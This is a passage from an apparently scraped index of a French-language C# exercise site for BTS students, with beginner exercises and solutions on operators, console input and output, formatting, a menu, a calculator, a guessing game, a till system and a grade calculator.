Console.WriteLine($\"a || b = {a || b}\");  // OU logique\n        Console.WriteLine($\"!a = {!a}\");         // NON logique\n        Console.WriteLine($\"!b = {!b}\");\n        Console.WriteLine($\"a &amp;&amp; !b = {a &amp;&amp; !b}\");\n    }\n}</code></pre> \ud83d\udd25 Interm\u00e9diaire \ud83d\udcca Comparaisons <p>Comparez deux nombres avec tous les op\u00e9rateurs de comparaison.</p> <p>Utilisez les nombres 10 et 15, testez <code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        int x = 10;\n        int y = 15;\n\n        Console.WriteLine($\"x = {x}, y = {y}\");\n        Console.WriteLine($\"x == y : {x == y}\");  // \u00c9gal\n        Console.WriteLine($\"x != y : {x != y}\");  // Diff\u00e9rent\n        Console.WriteLine($\"x &lt; y  : {x &lt; y}\");   // Inf\u00e9rieur\n        Console.WriteLine($\"x &gt; y  : {x &gt; y}\");   // Sup\u00e9rieur\n        Console.WriteLine($\"x &lt;= y : {x &lt;= y}\");  // Inf\u00e9rieur ou \u00e9gal\n        Console.WriteLine($\"x &gt;= y : {x &gt;= y}\");  // Sup\u00e9rieur ou \u00e9gal\n    }\n}</code></pre> \ud83d\ude80 Difficile \ud83c\udfaf Calculateur d'IMC <p>Cr\u00e9ez un calculateur d'Indice de Masse Corporelle (IMC).</p> <p>Formule: IMC = poids (kg) / (taille (m))\u00b2</p> <p>Utilisez poids = 70kg et taille = 1.75m. Affichez l'IMC avec 2 d\u00e9cimales et une interpr\u00e9tation simple.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        double poids = 70.0;  // kg\n        double taille = 1.75; // m\n\n        double imc = poids / (taille * taille);\n\n        Console.WriteLine($\"Poids: {poids} kg\");\n        Console.WriteLine($\"Taille: {taille} m\");\n        Console.WriteLine($\"IMC: {imc:F2}\");\n\n        // Interpr\u00e9tation simple\n        string interpretation;\n        if (imc &lt; 18.5)\n            interpretation = \"Insuffisance pond\u00e9rale\";\n        else if (imc &lt; 25)\n            interpretation = \"Poids normal\";\n        else if (imc &lt; 30)\n            interpretation = \"Surpoids\";\n        else\n            interpretation = \"Ob\u00e9sit\u00e9\";\n\n        Console.WriteLine($\"Interpr\u00e9tation: {interpretation}\");\n    }\n}</code></pre> \ud83d\ude80 Difficile \u23f0 Convertisseur de temps <p>Convertissez un nombre de secondes en heures, minutes et secondes.</p> <p>Exemple: 3665 secondes = 1 heure, 1 minute et 5 secondes.</p> <p>Utilisez les op\u00e9rateurs de division enti\u00e8re et modulo.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        int totalSecondes = 3665;\n\n        int heures = totalSecondes / 3600;\n        int minutes = (totalSecondes % 3600) / 60;\n        int secondes = totalSecondes % 60;\n\n        Console.WriteLine($\"Temps total: {totalSecondes} secondes\");\n        Console.WriteLine($\"Conversion: {heures}h {minutes}m {secondes}s\");\n\n        // Version avec formatage conditionnel\n        string resultat = \"\";\n        if (heures &gt; 0) resultat += $\"{heures}h \";\n        if (minutes &gt; 0) resultat += $\"{minutes}m \";\n        resultat += $\"{secondes}s\";\n\n        Console.WriteLine($\"Format compact: {resultat}\");\n    }\n}</code></pre> \ud83d\ude80 Difficile \ud83c\udfb2 G\u00e9n\u00e9rateur de nombres <p>Cr\u00e9ez un programme qui g\u00e9n\u00e8re et analyse des nombres al\u00e9atoires.</p> <p>G\u00e9n\u00e9rez 3 nombres al\u00e9atoires entre 1 et 100, calculez leur somme, moyenne, et trouvez le plus grand.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Random random = new Random();\n\n        int nombre1 = random.Next(1, 101);  // 1 \u00e0 100\n        int nombre2 = random.Next(1, 101);\n        int nombre3 = random.Next(1, 101);\n\n        Console.WriteLine($\"Nombres g\u00e9n\u00e9r\u00e9s: {nombre1}, {nombre2}, {nombre3}\");\n\n        int somme = nombre1 + nombre2 + nombre3;\n        double moyenne = somme / 3.0;\n        int maximum = Math.Max(Math.Max(nombre1, nombre2), nombre3);\n\n        Console.WriteLine($\"Somme: {somme}\");\n        Console.WriteLine($\"Moyenne: {moyenne:F2}\");\n        Console.WriteLine($\"Maximum: {maximum}\");\n\n        // Bonus: v\u00e9rifier si tous sont pairs\n        bool tousPairs = (nombre1 % 2 == 0) &amp;&amp; (nombre2 % 2 == 0) &amp;&amp; (nombre3 % 2 == 0);\n        Console.WriteLine($\"Tous pairs: {tousPairs}\");\n    }\n}</code></pre>"},{"location":"BTS/B2/Fiches_exercices/Exercices_entrees_sorties_CSharp/","title":"Exercices C# - Entr\u00e9es/Sorties Console\ud83d\udcac Exercices C# - Entr\u00e9es/Sorties Console","text":"<p>         Ma\u00eetrisez les interactions avec l'utilisateur en C# ! Ces exercices vous apprendront \u00e0 lire les donn\u00e9es saisies par l'utilisateur          et \u00e0 afficher des r\u00e9sultats format\u00e9s dans la console. D\u00e9couvrez les m\u00e9thodes <code>Console.ReadLine()</code>, <code>Console.Write()</code>          et les techniques de formatage avanc\u00e9es.     </p> \ud83c\udf31 Introduction \ud83d\udce5 Saisie utilisateur \ud83c\udfa8 Formatage \ud83c\udfae Programmes interactifs \ud83c\udf31 Introduction \ud83d\udc4b Salutation personnalis\u00e9e <p>Cr\u00e9ez un programme qui demande le nom de l'utilisateur et l'accueille personnellement.</p> <p>Utilisez <code>Console.ReadLine()</code> pour lire le nom et affichez \"Bonjour [nom] !\"</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.Write(\"Quel est votre nom ? \");\n        string nom = Console.ReadLine();\n        Console.WriteLine($\"Bonjour {nom} !\");\n    }\n}</code></pre> \ud83c\udf31 Introduction \ud83d\udd22 Saisie de nombres <p>Demandez \u00e0 l'utilisateur de saisir deux nombres et affichez leur somme.</p> <p>N'oubliez pas de convertir les cha\u00eenes en nombres avec <code>int.Parse()</code> ou <code>Convert.ToInt32()</code>.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.Write(\"Premier nombre : \");\n        int nombre1 = int.Parse(Console.ReadLine());\n\n        Console.Write(\"Deuxi\u00e8me nombre : \");\n        int nombre2 = int.Parse(Console.ReadLine());\n\n        int somme = nombre1 + nombre2;\n        Console.WriteLine($\"La somme de {nombre1} et {nombre2} est {somme}\");\n    }\n}</code></pre> \ud83c\udf31 Introduction \ud83d\udccf Calcul d'aire <p>Calculez l'aire d'un rectangle en demandant la longueur et la largeur.</p> <p>Formule : Aire = longueur \u00d7 largeur</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"=== Calcul d'aire d'un rectangle ===\");\n\n        Console.Write(\"Longueur (en cm) : \");\n        double longueur = double.Parse(Console.ReadLine());\n\n        Console.Write(\"Largeur (en cm) : \");\n        double largeur = double.Parse(Console.ReadLine());\n\n        double aire = longueur * largeur;\n\n        Console.WriteLine($\"L'aire du rectangle est {aire} cm\u00b2\");\n    }\n}</code></pre> \u2b50 Facile \ud83c\udf82 Calcul d'\u00e2ge interactif <p>Demandez l'ann\u00e9e de naissance et calculez l'\u00e2ge de l'utilisateur.</p> <p>Affichez un message personnalis\u00e9 selon l'\u00e2ge (mineur/majeur).</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.Write(\"En quelle ann\u00e9e \u00eates-vous n\u00e9(e) ? \");\n        int anneeNaissance = int.Parse(Console.ReadLine());\n\n        int anneeActuelle = DateTime.Now.Year;\n        int age = anneeActuelle - anneeNaissance;\n\n        Console.WriteLine($\"Vous avez {age} ans.\");\n\n        if (age &gt;= 18)\n            Console.WriteLine(\"Vous \u00eates majeur(e) !\");\n        else\n            Console.WriteLine($\"Vous serez majeur(e) dans {18 - age} an(s).\");\n    }\n}</code></pre> \u2b50 Facile \ud83c\udf21\ufe0f Convertisseur de temp\u00e9rature <p>Convertissez des degr\u00e9s Celsius en Fahrenheit.</p> <p>Formule : F = (C \u00d7 9/5) + 32</p> \ud83d\udca1 Astuce <p>Utilisez <code>double.Parse()</code> pour les nombres d\u00e9cimaux.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"=== Convertisseur Celsius \u2192 Fahrenheit ===\");\n\n        Console.Write(\"Temp\u00e9rature en Celsius : \");\n        double celsius = double.Parse(Console.ReadLine());\n\n        double fahrenheit = (celsius * 9.0 / 5.0) + 32;\n\n        Console.WriteLine($\"{celsius}\u00b0C = {fahrenheit:F1}\u00b0F\");\n\n        // Message selon la temp\u00e9rature\n        if (celsius &lt;= 0)\n            Console.WriteLine(\"Il fait tr\u00e8s froid ! \u2744\ufe0f\");\n        else if (celsius &gt;= 30)\n            Console.WriteLine(\"Il fait tr\u00e8s chaud ! \u2600\ufe0f\");\n        else\n            Console.WriteLine(\"Temp\u00e9rature agr\u00e9able ! \ud83d\ude0a\");\n    }\n}</code></pre> \ud83d\udd25 Interm\u00e9diaire \ud83d\uded2 Calculateur de prix <p>Calculez le prix total d'un achat avec TVA.</p> <p>Demandez le prix HT, le taux de TVA (en %), et calculez le prix TTC.</p> <p>Affichez aussi le montant de la TVA.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"=== Calculateur de prix avec TVA ===\");\n\n        Console.Write(\"Prix HT (\u20ac) : \");\n        double prixHT = double.Parse(Console.ReadLine());\n\n        Console.Write(\"Taux de TVA (%) : \");\n        double tauxTVA = double.Parse(Console.ReadLine());\n\n        double montantTVA = prixHT * tauxTVA / 100;\n        double prixTTC = prixHT + montantTVA;\n\n        Console.WriteLine(\"\\n=== FACTURE ===\");\n        Console.WriteLine($\"Prix HT    : {prixHT:F2} \u20ac\");\n        Console.WriteLine($\"TVA ({tauxTVA}%)   : {montantTVA:F2} \u20ac\");\n        Console.WriteLine($\"Prix TTC   : {prixTTC:F2} \u20ac\");\n    }\n}</code></pre> \u2b50 Facile \ud83d\udcca Tableau de donn\u00e9es <p>Cr\u00e9ez un tableau format\u00e9 avec les informations d'une personne.</p> <p>Demandez nom, pr\u00e9nom, \u00e2ge et ville, puis affichez-les dans un tableau align\u00e9.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"=== Saisie d'informations ===\");\n\n        Console.Write(\"Nom : \");\n        string nom = Console.ReadLine();\n\n        Console.Write(\"Pr\u00e9nom : \");\n        string prenom = Console.ReadLine();\n\n        Console.Write(\"\u00c2ge : \");\n        int age = int.Parse(Console.ReadLine());\n\n        Console.Write(\"Ville : \");\n        string ville = Console.ReadLine();\n\n        Console.WriteLine(\"\\n\" + new string('=', 40));\n        Console.WriteLine(\"           FICHE PERSONNELLE\");\n        Console.WriteLine(new string('=', 40));\n        Console.WriteLine($\"{\"Nom\",-12} : {nom}\");\n        Console.WriteLine($\"{\"Pr\u00e9nom\",-12} : {prenom}\");\n        Console.WriteLine($\"{\"\u00c2ge\",-12} : {age} ans\");\n        Console.WriteLine($\"{\"Ville\",-12} : {ville}\");\n        Console.WriteLine(new string('=', 40));\n    }\n}</code></pre> \ud83d\udd25 Interm\u00e9diaire \ud83d\udcb0 Formatage mon\u00e9taire <p>Cr\u00e9ez un programme qui affiche des montants avec diff\u00e9rents formats.</p> <p>Demandez un montant et affichez-le en euros, dollars et avec diff\u00e9rentes pr\u00e9cisions.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\nusing System.Globalization;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.Write(\"Montant en euros : \");\n        double montant = double.Parse(Console.ReadLine());\n\n        double montantDollars = montant * 1.10; // Taux fictif\n\n        Console.WriteLine(\"\\n=== FORMATAGE MON\u00c9TAIRE ===\");\n        Console.WriteLine($\"Format standard    : {montant:F2} \u20ac\");\n        Console.WriteLine($\"Format mon\u00e9taire   : {montant:C}\");\n        Console.WriteLine($\"Sans d\u00e9cimales     : {montant:F0} \u20ac\");\n        Console.WriteLine($\"3 d\u00e9cimales        : {montant:F3} \u20ac\");\n        Console.WriteLine($\"En dollars         : ${montantDollars:F2}\");\n        Console.WriteLine($\"Notation comptable : {montant,15:F2} \u20ac\");\n\n        if (montant &gt;= 1000)\n            Console.WriteLine($\"Avec s\u00e9parateurs   : {montant:N2} \u20ac\");\n    }\n}</code></pre> \ud83d\udd25 Interm\u00e9diaire \ud83d\udcc5 Formatage de dates <p>Affichez la date actuelle dans diff\u00e9rents formats.</p> <p>Montrez les formats court, long, personnalis\u00e9 et dans diff\u00e9rentes langues.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\nusing System.Globalization;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.Write(\"Entrez votre nom : \");\n        string nom = Console.ReadLine();\n\n        DateTime maintenant = DateTime.Now;\n\n        Console.WriteLine($\"\\nBonjour {nom} !\");\n        Console.WriteLine(\"\\n=== FORMATS DE DATE ===\");\n        Console.WriteLine($\"Date courte        : {maintenant:d}\");\n        Console.WriteLine($\"Date longue        : {maintenant:D}\");\n        Console.WriteLine($\"Date et heure      : {maintenant:F}\");\n        Console.WriteLine($\"Format ISO         : {maintenant:yyyy-MM-dd}\");\n        Console.WriteLine($\"Format personnalis\u00e9: {maintenant:dddd dd MMMM yyyy}\");\n        Console.WriteLine($\"Heure seulement    : {maintenant:HH:mm:ss}\");\n        Console.WriteLine($\"Format US          : {maintenant.ToString(\"MM/dd/yyyy\", CultureInfo.InvariantCulture)}\");\n    }\n}</code></pre> \ud83d\ude80 Difficile \ud83c\udfae Menu interactif <p>Cr\u00e9ez un menu interactif avec plusieurs options.</p> <p>Le programme doit afficher un menu, lire le choix de l'utilisateur et ex\u00e9cuter l'action correspondante.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        bool continuer = true;\n\n        while (continuer)\n        {\n            Console.Clear();\n            Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n            Console.WriteLine(\"\u2551        MENU PRINCIPAL        \u2551\");\n            Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n            Console.WriteLine(\"\u2551 1. Calculer une aire         \u2551\");\n            Console.WriteLine(\"\u2551 2. Convertir temp\u00e9rature     \u2551\");\n            Console.WriteLine(\"\u2551 3. Calculer l'\u00e2ge            \u2551\");\n            Console.WriteLine(\"\u2551 4. Quitter                   \u2551\");\n            Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n            Console.Write(\"\\nVotre choix (1-4) : \");\n\n            string choix = Console.ReadLine();\n\n            switch (choix)\n            {\n                case \"1\":\n                    CalculerAire();\n                    break;\n                case \"2\":\n                    ConvertirTemperature();\n                    break;\n                case \"3\":\n                    CalculerAge();\n                    break;\n                case \"4\":\n                    continuer = false;\n                    Console.WriteLine(\"Au revoir !\");\n                    break;\n                default:\n                    Console.WriteLine(\"Choix invalide !\");\n                    break;\n            }\n\n            if (continuer)\n            {\n                Console.WriteLine(\"\\nAppuyez sur une touche pour continuer...\");\n                Console.ReadKey();\n            }\n        }\n    }\n\n    static void CalculerAire()\n    {\n        Console.Write(\"Longueur : \");\n        double longueur = double.Parse(Console.ReadLine());\n        Console.Write(\"Largeur : \");\n        double largeur = double.Parse(Console.ReadLine());\n        Console.WriteLine($\"Aire = {longueur * largeur} unit\u00e9s\u00b2\");\n    }\n\n    static void ConvertirTemperature()\n    {\n        Console.Write(\"Temp\u00e9rature en \u00b0C : \");\n        double celsius = double.Parse(Console.ReadLine());\n        double fahrenheit = (celsius * 9.0 / 5.0) + 32;\n        Console.WriteLine($\"{celsius}\u00b0C = {fahrenheit:F1}\u00b0F\");\n    }\n\n    static void CalculerAge()\n    {\n        Console.Write(\"Ann\u00e9e de naissance : \");\n        int annee = int.Parse(Console.ReadLine());\n        int age = DateTime.Now.Year - annee;\n        Console.WriteLine($\"Vous avez {age} ans\");\n    }\n}</code></pre> \ud83d\ude80 Difficile \ud83e\uddee Calculatrice avanc\u00e9e <p>Cr\u00e9ez une calculatrice interactive compl\u00e8te.</p> <p>L'utilisateur saisit deux nombres et choisit l'op\u00e9ration. G\u00e9rez les erreurs (division par z\u00e9ro, saisie invalide).</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"\ud83e\uddee CALCULATRICE AVANC\u00c9E \ud83e\uddee\\n\");\n\n        try\n        {\n            Console.Write(\"Premier nombre : \");\n            double nombre1 = double.Parse(Console.ReadLine());\n\n            Console.Write(\"Deuxi\u00e8me nombre : \");\n            double nombre2 = double.Parse(Console.ReadLine());\n\n            Console.WriteLine(\"\\nOp\u00e9rations disponibles :\");\n            Console.WriteLine(\"+ : Addition\");\n            Console.WriteLine(\"- : Soustraction\");\n            Console.WriteLine(\"* : Multiplication\");\n            Console.WriteLine(\"/ : Division\");\n            Console.WriteLine(\"% : Modulo\");\n            Console.WriteLine(\"^ : Puissance\");\n\n            Console.Write(\"\\nChoisissez une op\u00e9ration : \");\n            string operation = Console.ReadLine();\n\n            double resultat = 0;\n            bool operationValide = true;\n\n            switch (operation)\n            {\n                case \"+\":\n                    resultat = nombre1 + nombre2;\n                    break;\n                case \"-\":\n                    resultat = nombre1 - nombre2;\n                    break;\n                case \"*\":\n                    resultat = nombre1 * nombre2;\n                    break;\n                case \"/\":\n                    if (nombre2 == 0)\n                    {\n                        Console.WriteLine(\"\u274c Erreur : Division par z\u00e9ro impossible !\");\n                        operationValide = false;\n                    }\n                    else\n                        resultat = nombre1 / nombre2;\n                    break;\n                case \"%\":\n                    if (nombre2 == 0)\n                    {\n                        Console.WriteLine(\"\u274c Erreur : Modulo par z\u00e9ro impossible !\");\n                        operationValide = false;\n                    }\n                    else\n                        resultat = nombre1 % nombre2;\n                    break;\n                case \"^\":\n                    resultat = Math.Pow(nombre1, nombre2);\n                    break;\n                default:\n                    Console.WriteLine(\"\u274c Op\u00e9ration non reconnue !\");\n                    operationValide = false;\n                    break;\n            }\n\n            if (operationValide)\n            {\n                Console.WriteLine($\"\\n\u2705 R\u00e9sultat : {nombre1} {operation} {nombre2} = {resultat:F2}\");\n            }\n        }\n        catch (FormatException)\n        {\n            Console.WriteLine(\"\u274c Erreur : Veuillez saisir des nombres valides !\");\n        }\n        catch (Exception ex)\n        {\n            Console.WriteLine($\"\u274c Erreur inattendue : {ex.Message}\");\n        }\n    }\n}</code></pre> \ud83d\ude80 Difficile \ud83c\udfaf Jeu de devinette <p>Cr\u00e9ez un jeu o\u00f9 l'utilisateur doit deviner un nombre.</p> <p>Le programme g\u00e9n\u00e8re un nombre al\u00e9atoire entre 1 et 100. L'utilisateur a des indices \"trop grand\" ou \"trop petit\".</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Random random = new Random();\n        int nombreSecret = random.Next(1, 101);\n        int tentatives = 0;\n        int maxTentatives = 7;\n        bool trouve = false;\n\n        Console.WriteLine(\"\ud83c\udfaf JEU DE DEVINETTE \ud83c\udfaf\");\n        Console.WriteLine(\"J'ai choisi un nombre entre 1 et 100.\");\n        Console.WriteLine($\"Vous avez {maxTentatives} tentatives pour le trouver !\\n\");\n\n        while (!trouve &amp;&amp; tentatives &lt; maxTentatives)\n        {\n            tentatives++;\n            Console.Write($\"Tentative {tentatives}/{maxTentatives} - Votre nombre : \");\n\n            try\n            {\n                int proposition = int.Parse(Console.ReadLine());\n\n                if (proposition &lt; 1 || proposition &gt; 100)\n                {\n                    Console.WriteLine(\"\u26a0\ufe0f Le nombre doit \u00eatre entre 1 et 100 !\");\n                    tentatives--; // Ne pas compter cette tentative\n                    continue;\n                }\n\n                if (proposition == nombreSecret)\n                {\n                    trouve = true;\n                    Console.WriteLine($\"\ud83c\udf89 Bravo ! Vous avez trouv\u00e9 en {tentatives} tentative(s) !\");\n\n                    if (tentatives &lt;= 3)\n                        Console.WriteLine(\"\ud83c\udfc6 Excellent ! Vous \u00eates un expert !\");\n                    else if (tentatives &lt;= 5)\n                        Console.WriteLine(\"\ud83d\udc4d Bien jou\u00e9 !\");\n                    else\n                        Console.WriteLine(\"\ud83d\ude05 Vous y \u00eates arriv\u00e9 de justesse !\");\n                }\n                else if (proposition &lt; nombreSecret)\n                {\n                    Console.WriteLine(\"\ud83d\udcc8 Trop petit ! Essayez plus grand.\");\n                }\n                else\n                {\n                    Console.WriteLine(\"\ud83d\udcc9 Trop grand ! Essayez plus petit.\");\n                }\n\n                if (!trouve &amp;&amp; tentatives &lt; maxTentatives)\n                {\n                    int ecart = Math.Abs(proposition - nombreSecret);\n                    if (ecart &lt;= 5)\n                        Console.WriteLine(\"\ud83d\udd25 Vous \u00eates tr\u00e8s proche !\");\n                    else if (ecart &lt;= 10)\n                        Console.WriteLine(\"\ud83c\udf21\ufe0f Vous vous rapprochez !\");\n                }\n            }\n            catch (FormatException)\n            {\n                Console.WriteLine(\"\u274c Veuillez saisir un nombre valide !\");\n                tentatives--; // Ne pas compter cette tentative\n            }\n\n            Console.WriteLine();\n        }\n\n        if (!trouve)\n        {\n            Console.WriteLine($\"\ud83d\ude1e Dommage ! Le nombre \u00e9tait {nombreSecret}.\");\n            Console.WriteLine(\"Essayez encore une prochaine fois !\");\n        }\n    }\n}</code></pre>"},{"location":"BTS/B2/Fiches_exercices/Projets_pratiques_CSharp/","title":"Projets Pratiques C# - Applications Compl\u00e8tes\ud83d\ude80 Projets Pratiques C# - Applications Compl\u00e8tes","text":"<p>         Mettez en pratique tous vos acquis en C# avec des projets complets et r\u00e9alistes !          Ces applications combinent variables, types, op\u00e9rateurs, entr\u00e9es/sorties et logique m\u00e9tier          pour cr\u00e9er des programmes utiles et fonctionnels. Chaque projet est con\u00e7u pour renforcer          votre compr\u00e9hension et votre ma\u00eetrise du langage C#.     </p> \ud83c\udf31 D\u00e9butant \ud83d\udd25 Interm\u00e9diaire \ud83d\ude80 Avanc\u00e9 \ud83d\udc51 Expert \ud83c\udf31 D\u00e9butant \ud83c\udfea Syst\u00e8me de Caisse <p>Cr\u00e9ez un syst\u00e8me de caisse simple pour un magasin.</p> \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter : <ul> <li>Saisie du prix de plusieurs articles</li> <li>Calcul du sous-total</li> <li>Application d'une remise (en %)</li> <li>Calcul de la TVA (20%)</li> <li>Affichage du ticket de caisse format\u00e9</li> </ul> \u23f1\ufe0f 30-45 min \ud83d\udcdd ~50 lignes \ud83c\udfaf Variables, calculs, formatage \ud83d\udca1 Voir la solution compl\u00e8te              <pre><code>using System;\n\nclass SystemeCaisse\n{\n    static void Main()\n    {\n        Console.WriteLine(\"\ud83c\udfea SYST\u00c8ME DE CAISSE \ud83c\udfea\");\n        Console.WriteLine(\"========================\\n\");\n\n        // Variables pour le calcul\n        double sousTotal = 0;\n        int nombreArticles = 0;\n\n        // Saisie des articles\n        Console.WriteLine(\"Saisissez le prix des articles (0 pour terminer) :\");\n\n        while (true)\n        {\n            Console.Write($\"Article {nombreArticles + 1} (\u20ac) : \");\n            double prix = double.Parse(Console.ReadLine());\n\n            if (prix == 0) break;\n\n            if (prix &gt; 0)\n            {\n                sousTotal += prix;\n                nombreArticles++;\n                Console.WriteLine($\"  \u2713 Article ajout\u00e9 : {prix:F2}\u20ac\");\n            }\n            else\n            {\n                Console.WriteLine(\"  \u274c Prix invalide !\");\n            }\n        }\n\n        if (nombreArticles == 0)\n        {\n            Console.WriteLine(\"Aucun article saisi. Au revoir !\");\n            return;\n        }\n\n        // Remise\n        Console.Write(\"\\nRemise en % (0 si aucune) : \");\n        double pourcentageRemise = double.Parse(Console.ReadLine());\n        double montantRemise = sousTotal * pourcentageRemise / 100;\n        double totalApresRemise = sousTotal - montantRemise;\n\n        // TVA\n        double tauxTVA = 20.0;\n        double montantTVA = totalApresRemise * tauxTVA / 100;\n        double totalTTC = totalApresRemise + montantTVA;\n\n        // Affichage du ticket\n        Console.Clear();\n        Console.WriteLine(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");\n        Console.WriteLine(\"\u2551           TICKET DE CAISSE       \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 Nombre d'articles : {nombreArticles,12} \u2551\");\n        Console.WriteLine($\"\u2551 Sous-total       : {sousTotal,12:F2}\u20ac \u2551\");\n\n        if (pourcentageRemise &gt; 0)\n        {\n            Console.WriteLine($\"\u2551 Remise ({pourcentageRemise}%)      : -{montantRemise,11:F2}\u20ac \u2551\");\n            Console.WriteLine($\"\u2551 Total apr\u00e8s remise: {totalApresRemise,11:F2}\u20ac \u2551\");\n        }\n\n        Console.WriteLine($\"\u2551 TVA ({tauxTVA}%)         : {montantTVA,12:F2}\u20ac \u2551\");\n        Console.WriteLine(\"\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\");\n        Console.WriteLine($\"\u2551 TOTAL TTC        : {totalTTC,12:F2}\u20ac \u2551\");\n        Console.WriteLine(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");\n\n        // Statistiques\n        double prixMoyen = sousTotal / nombreArticles;\n        Console.WriteLine($\"\\n\ud83d\udcca Prix moyen par article : {prixMoyen:F2}\u20ac\");\n        Console.WriteLine($\"\ud83d\udcb0 \u00c9conomies r\u00e9alis\u00e9es : {montantRemise:F2}\u20ac\");\n\n        Console.WriteLine(\"\\nMerci de votre achat ! \ud83d\ude0a\");\n    }\n}</code></pre> \ud83c\udf31 D\u00e9butant \ud83d\udcca Calculateur de Notes <p>D\u00e9veloppez un syst\u00e8me de gestion des notes d'un \u00e9tudiant.</p> \ud83d\udccb Fonctionnalit\u00e9s \u00e0 impl\u00e9menter : <ul> <li>Saisie de plusieurs notes (sur 20)</li> <li>Calcul de la moyenne g\u00e9n\u00e9rale</li> <li>D\u00e9termination de la mention</li> <li>Affichage du bulletin format\u00e9</li> <li>Statistiques (note min/max, \u00e9cart-type)</li> </ul> \u23f1\ufe0f 25-35 min \ud83d\udcdd ~60 lignes \ud83c\udfaf Tableaux, moyennes, conditions \ud83d\udca1 Voir la solution compl\u00e8te              <pre><code>using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass CalculateurNotes\n{\n    static void Main()\n    {\n        Console.WriteLine(\"\ud83d\udcca CALCULATEUR DE NOTES \ud83d\udcca\");\n        Console.WriteLine(\"===========================\\n\");\n\n        // Informations \u00e9tudiant\n        Console.Write(\"Nom de l'\u00e9tudiant : \");\n        string nom = Console.ReadLine();\n\n        Console.Write(\"Mati\u00e8re : \");\n        string matiere = Console.ReadLine();\n\n        // Saisie des notes\n        List notes = new List();\n        Console.WriteLine(\"\\nSaisissez les notes (sur 20, -1 pour terminer) :\");\n\n        int numeroNote = 1;\n        while (true)\n        {\n            Console.Write($\"Note {numeroNote} : \");\n            double note = double.Parse(Console.ReadLine());\n\n            if (note == -1) break;\n\n            if (note &gt;= 0 &amp;&amp; note &lt;= 20)\n            {\n                notes.Add(note);\n                numeroNote++;\n                Console.WriteLine($\"  \u2713 Note enregistr\u00e9e : {note:F1}/20\");\n            }\n            else\n            {\n                Console.WriteLine(\"  \u274c Note invalide (0-20) !\");\n            }\n        }\n\n        if (notes.Count == 0)\n        {\n            Console.WriteLine(\"Aucune note saisie !\");\n            return;\n        }\n\n        // Calculs\n        double moyenne = notes.Average();\n        double noteMin = notes.Min();\n        double noteMax = notes.Max();\n\n        // Calcul de l'\u00e9cart-type\n        double variance = notes.Select(x =&gt; Math.Pow(x - moyenne, 2)).Average();\n        double ecartType = Math.Sqrt(variance);\n\n        // D\u00e9termination de la mention\n        string mention;\n        string emoji;\n\n        if (moyenne &gt;= 16)\n        {\n            mention = \"Tr\u00e8s Bien\";\n            emoji = 